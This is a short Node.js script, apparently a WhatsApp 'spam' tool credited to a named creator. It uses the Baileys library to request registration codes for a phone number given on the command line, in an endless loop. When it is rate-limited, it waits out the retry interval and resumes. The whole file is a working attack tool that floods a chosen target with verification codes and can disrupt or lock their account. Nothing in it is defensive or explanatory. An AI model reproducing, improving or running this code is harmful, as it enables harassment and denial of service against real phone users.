const gradient = require('gradient-string');
const pino = require('pino');
const fs = require('fs');

const { default: makeWaSocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');

// Inisialisasi numbers
const numbers = {
  "0": {
    "ddi": null,
    "number": null
  },
  "55": {
    "ddi": "55",
    "number": ""
  }
};

const start = async () => {
  const { state, saveCreds } = await useMultiFileAuthState('.oiii')

  const spam = makeWaSocket({
    auth: state,
    mobile: true,
    logger: pino({ level: 'silent' })
  });

  const dropNumber = async (context) => {
    const { phoneNumber, ddi, number } = context;
    while (true) {
      try {
        console.clear();
        console.log(gradient('red', 'blue')(`
        
█ █▀█ █▀▀ ▄▀█ █▄░█  
█ █▀▄ █▀░ █▀█ █░▀█  

█░░ █▀▀ ▄▀█ █▀▄ █▀▀ █▀█   █░█░█ ░ █░█ ░ ▀█▀
█▄▄ ██▄ █▀█ █▄▀ ██▄ █▀▄   ▀▄▀▄▀ ▄ █▀█ ▄ ░█░

Target: +${ddi}${number}`))

        res = await spam.requestRegistrationCode({
          phoneNumber: '+' + phoneNumber,
          phoneNumberCountryCode: ddi,
          phoneNumberNationalNumber: number,
          phoneNumberMobileCountryCode: 724
        })
        b = (res.reason === 'temporarily_unavailable');
        if (b) {
          setTimeout(async () => {
            dropNumber(context)
          }, res.retry_after * 1000)
          return;
        }
      } catch (error) {
        //console.log(error)
      }
    }
  }

  console.clear();
  console.log(gradient('black', 'black')(`@irfannotsepuh`))
  console.log(gradient('purple', 'cyan')('CREATOR: @irfannotsepuh'))
  console.log(gradient('black', 'black')(`@irfannotsepuh`))

  let ddi = process.argv[2];
  let number = process.argv[3];
  let phoneNumber = ddi + number;
  numbers[ddi] = { ddi, number }
  dropNumber({ phoneNumber, ddi, number })
  console.clear();
}

start();
